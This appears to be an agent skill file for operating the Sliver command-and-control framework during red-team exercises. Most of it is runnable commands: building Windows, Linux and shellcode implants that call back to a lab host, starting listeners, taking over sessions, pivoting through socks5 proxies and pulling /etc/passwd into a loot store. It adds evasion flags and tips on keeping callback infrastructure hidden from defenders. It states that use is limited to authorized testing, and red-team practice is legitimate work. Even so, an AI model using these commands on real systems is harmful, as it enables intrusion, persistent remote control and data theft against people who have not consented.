---
name: sliver
description: "Drive the Sliver C2 server console to build implants, run mTLS/HTTP/WireGuard listeners, manage sessions and beacons, proxy traffic and store loot. Use when you control both ends of an authorized red-team exercise and need a command channel. Not for credential spraying or share enumeration (use netexec)."
---

# Sliver

Sliver is a Bishop Fox C2 framework shipped as one compiled server binary. The server owns the database, the certificate authority, the implant builder and an interactive console; operators either sit at that console or connect over multiplayer gRPC with an operator config. On this host the binaries are `/opt/tools/sliver-server` and `/opt/tools/sliver-client` (v1.7.9, linux/amd64); neither is on `PATH`, so call them by absolute path or add `/opt/tools`.

Use it only against hosts you own or are explicitly authorized to test. Everything the console does is written to `~/.sliver/sliver.db` and to the operator log.

## When to use

| Goal | Command area | Shape |
| --- | --- | --- |
| Open a channel back to the lab | `mtls`, `http`, `https`, `wg` | `mtls --lport 8888` |
| Build an implant for a target OS | `generate` | `generate --mtls 10.0.0.5 --os linux --save /tmp/imp` |
| See what was built | `implants` | `implants -s -o linux` |
| Work an interactive shell | `sessions`, `use` | `use <session name>` |
| Work a low-noise channel | `beacons` | `beacons -i <name>` |
| Pivot into a reachable subnet | `socks5` | `socks5`, then proxy through it |
| Carry a sensor or lateral tool | `generate --tcp-pivot` | `generate --tcp-pivot host:port` |
| Keep exfiltrated files server-side | `loot` | `loot local ./file`, `loot fetch -s out.bin` |
| Add a second operator | `multiplayer`, `new-operator` | `new-operator --name op2 --lhost 10.0.0.5 --permissions all` |
| Wipe a lab between runs | `clean` | `clean` |

Single-player means the console you launched is the only operator. Multiplayer means `multiplayer` is listening, operator configs exist, and `operators` shows who is connected. Both modes share one database, one CA and one loot store.

## Prerequisites

- `/opt/tools/sliver-server version` prints `v1.7.9`. Always call it by full path or add `/opt/tools` to `PATH`.
- First start is not interactive: it prints the GPL banner, then `Unpacking assets ...`, and spends roughly 30 seconds writing `~/.sliver` (Go toolchain, zig, `sliver.db`, `configs`, `traffic-encoders`). Do not kill it before the console prompt appears.
- Generating implants needs that unpacked toolchain and disk space; `generate info` reports the compiler the server will use.
- `sliver-client` is installed at `/opt/tools/sliver-client`. It needs an operator config: `new-operator --name op --lhost <ip> --save ./op.cfg` in the server console, then `sliver-client --config ./op.cfg` (or drop the file in `~/.sliver-client/configs/`).
- Lab hosts must be able to reach the listener address you pass to `generate`. Localhost callbacks fail from a VM.

## Core invocations

The server console reads commands from stdin, so every console action can be scripted with a pipe or with `--rc`.

```sh
# 1. version and asset unpack, no console
/opt/tools/sliver-server version
timeout 60 /opt/tools/sliver-server unpack

# 2. run one console command and exit (no interactive TTY needed)
printf 'help\n' | timeout 40 /opt/tools/sliver-server

# 3. same via an rc script, useful for repeatable lab setup
printf 'mtls --lport 8888\njobs\n' > /tmp/sliver.rc
timeout 60 /opt/tools/sliver-server --rc /tmp/sliver.rc

# 4. listeners
printf 'mtls --lport 8888\nhttp --lport 80 --domain cdn.example.test\nwg --lport 53\njobs\n' \
  | timeout 60 /opt/tools/sliver-server

# 5. build an implant: mTLS Windows PE, saved to disk (create the dir first)
mkdir -p /tmp/lab
printf 'generate --mtls 10.0.0.5:8888 --os windows --arch amd64 --save /tmp/lab/imp.exe\n' \
  | timeout 180 /opt/tools/sliver-server

# 6. build a Linux ELF over HTTP with a named profile
printf 'generate --http 10.0.0.5:80 --os linux --format exe --name lab-linux -s /tmp/lab/imp\n' \
  | timeout 180 /opt/tools/sliver-server

# 7. shellcode for a loader, plus the encoders the server supports
printf 'shellcode-encoders\n' | timeout 30 /opt/tools/sliver-server
printf 'generate --mtls 10.0.0.5:8888 --format shellcode --shellcode-compress -s /tmp/lab/imp.bin\n' \
  | timeout 180 /opt/tools/sliver-server

# 8. inventory builds, then check compiler settings
printf 'implants\nimplants -o linux -s\ngenerate info\n' | timeout 40 /opt/tools/sliver-server

# 9. sessions and beacons: list, filter, interact, kill
printf 'sessions\nsessions -f lab\nsessions -k <session-id>\nbeacons -i <beacon-name>\n' \
  | timeout 60 /opt/tools/sliver-server

# 10. take over the console's active session, then proxy through it
printf 'use <session-name>\nsocks5\n' | timeout 60 /opt/tools/sliver-server

# 11. stop a proxy by id
printf 'socks5 stop -i 1\n' | timeout 30 /opt/tools/sliver-server

# 12. loot: pull a file back from the active session and fetch it locally
printf 'loot remote /etc/passwd\nloot\nloot fetch -s /tmp/lab/loot.bin\n' \
  | timeout 60 /opt/tools/sliver-server

# 13. server-side host and credential stores
printf 'hosts\nhosts ioc\ncreds\n' | timeout 30 /opt/tools/sliver-server

# 14. multiplayer: open the gRPC listener, then mint an operator profile
printf 'multiplayer --lport 31337\n' | timeout 60 /opt/tools/sliver-server
printf 'new-operator --name op2 --lhost 10.0.0.5 --lport 31337 --permissions all\n' \
  | timeout 30 /opt/tools/sliver-server

# 15. same profile without the console (CLI subcommand)
/opt/tools/sliver-server operator --name op2 --lhost 10.0.0.5 --lport 31337 -P all \
  -s /tmp/lab/op2.cfg
```

`generate` also has a beacon form, `generate beacon ...`, for poll-based implants with `--poll-timeout`. Session-mode commands (`ls`, `download`, `ps`, `portfwd`, `pivots`) appear only after `use`; they are not part of the server console help and are not listed here.

## Flags that matter

| Flag | Command | Effect |
| --- | --- | --- |
| `-m, --mtls` | generate | mTLS callback strings, comma separated |
| `-b, --http` | generate | HTTP(S) callback strings; pair with `-C` profile |
| `-n, --dns` | generate | DNS callback domains |
| `-g, --wg` | generate | WireGuard callback; tune with `-X/--key-exchange` and `-T/--tcp-comms` |
| `-i, --tcp-pivot` | generate | pivot transport to another listener |
| `-o, --os`, `-a, --arch` | generate | target platform, default `windows`/`amd64` |
| `-f, --format` | generate | `exe`, `shared`, `service`, `shellcode`, `archive` |
| `-s, --save` | generate | output path; without it the server stores the build only |
| `-C, --c2profile` | generate | HTTP profile name, default `default` |
| `-e, --evasion` | generate | enable evasion features such as userland hook overwrite |
| `-c, --canary` | generate | per-implant canary domain, detects binary discovery |
| `--limit-hostname`, `--limit-username`, `--limit-domainjoined` | generate | refuse to run outside the named conditions |
| `-L, --lhost`, `-l, --lport` | mtls/http/wg/multiplayer | bind interface and port |
| `-d, --domain` | http | answer only for that Host header |
| `-D, --disable-otp` | http | turn off the per-session OTP gate |
| `-T, --tailscale` | multiplayer | expose the listener only over Tailscale |
| `--enable-wg` | multiplayer, new-operator, operator | wrap multiplayer in WireGuard |
| `-P, --permissions` | new-operator, operator | `all`, `builder`, `crackstation` |
| `-t, --timeout` | most verbs | gRPC timeout in seconds, default 60 |

## Workflow

1. **Read the console help, not the docs.** `printf 'help\n' | sliver-server` lists every verb this build actually has; per-verb `--help` shows the exact flags. Upstream documentation drifts from a compiled release.
2. **Fix the identity of the server first.** The CA and configs under `~/.sliver` are the server. Back them up (`export-ca`) before a lab you care about; regenerate by deleting the directory only when you want a new identity.
3. **Start the listener you intend to use and confirm it in `jobs`.** A listener that is not in `jobs` will not answer an implant, and the implant will look broken.
4. **Generate for the target you have, not the target you want.** OS, arch and callback address decide whether the binary works at all; `--save` decides whether you keep the artefact.
5. **Track builds in `implants`.** Every build is recorded with OS, arch, format and debug flag; `implants -s` filters to session-capable builds.
6. **Interact with `use`, not by guessing.** `sessions` prints names and IDs; `use <name>` switches context; session-mode commands then act on that host.
7. **Pivot with `socks5`, not ad-hoc tunnels.** Start the proxy, point the client tooling at it, and stop it with `socks5 stop -i <id>` when done.
8. **Harvest through `loot`.** `loot remote` pulls from the active session into the server store, `loot local` adds a local file, `loot fetch -s` writes it back out. Loot is shared with every operator.
9. **Clean up.** `clean` deletes profiles, beacons, sessions, builds and HTTP profiles; the database and log files stay on disk.

## OPSEC and telemetry

- The server keeps `~/.sliver/sliver.db` (plus WAL) and logs every task, result and operator action. Treat the working directory as evidence.
- Default mTLS implants carry the server's certificate chain; a defender with the implant binary can extract the callback address and the CA. Rotate the CA per engagement rather than reusing one.
- HTTP implants beacon on a long-poll interval; `http` exposes `--long-poll-timeout` and `--long-poll-jitter` precisely because fixed intervals are a detection signal. Beacon mode adds `--poll-timeout`.
- `--canary` embeds an unobfuscated per-implant domain so that a defender who strings the binary and resolves the domain tells you the implant was found. It requires a DNS listener to be useful.
- Every generated binary is a unique artefact; uploading it to a public sandbox gives the defender your callback infrastructure and your canary.
- Multiplayer is gRPC with mTLS on 31337 by default. An operator config is a private key: it belongs in a file with restrictive permissions, never in a repo.
- `monitor` watches threat-intel platforms for your implants; enabling it sends telemetry about your infrastructure to those services.

## Failure modes

| Symptom | Cause | Fix |
| --- | --- | --- |
| First start prints "Unpacking assets ..." and appears to hang | one-time toolchain unpack into `~/.sliver` | wait, or run `sliver-server unpack` first and check exit code |
| `unknown command "implant"` | verb is `implants` | use the names from `help`, which is authoritative per build |
| `Unknown help topic [pivots]` | `pivots` is a client session-mode command, not a server verb in v1.7.9 | inspect pivot support on a live session, or use `socks5` / `--tcp-pivot` |
| `generate` fails immediately | no unpacked compiler, or wrong `--os/--arch` pair | run `generate info`, then `unpack` |
| Implant runs but never calls back | callback address unreachable from target, or listener not in `jobs` | `jobs`, then test the port from the target subnet |
| New session never appears | implant built for a different arch or blocked at egress | `implants -o <os>`, check egress filtering |
| Operator config rejected | config path wrong, or file permissions too narrow | `sliver-client --config /abs/path.cfg`; `new-operator -P all` for full access |
| `socks5` connects but traffic dies | session dropped or proxy id stale | `sessions`, `socks5 stop -i <id>`, restart |

## Verification

```sh
/opt/tools/sliver-server version
# v1.7.9 - Compiled ... - linux/amd64

printf 'help\n' | timeout 40 /opt/tools/sliver-server | grep -c '^  '
# dozens of verbs; the Multiplayer, Network, Payload and Sliver groups are present

printf 'sessions\nimplants\nloot\n' | timeout 40 /opt/tools/sliver-server
# clean start prints nothing for these verbs, and no traceback

printf 'generate --help\n' | timeout 40 /opt/tools/sliver-server | grep -E 'mtls|http|wg|save'
# the transport and output flags above are all present in this build
```

Evidence to keep for a lab run: the console transcript, the `jobs` output, the build ID from `implants`, and the session ID from `sessions`.

## Related skills

- [netexec](../netexec/SKILL.md) to validate credentials before you deploy an implant
- [impacket](../impacket/SKILL.md) for Kerberos, relay and service-level access alongside a session
- [redteam-toolchain](../redteam-toolchain/SKILL.md) for the wider operator layout
- [toolchain-router](../toolchain-router/SKILL.md) when another C2 or tunnel fits the target better
